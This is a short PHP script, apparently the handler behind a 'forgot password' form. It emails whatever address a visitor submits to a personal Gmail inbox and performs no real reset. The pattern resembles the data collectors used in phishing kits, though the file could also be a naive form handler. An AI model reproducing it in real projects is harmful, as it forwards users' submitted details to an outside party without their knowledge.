<?php
    $to = "gooddealthanks@gmail.com";
    $subject = "Forgot password";
    $txt = "Email: " . $_POST["uEmail"];

    mail($to,$subject,$txt);
?>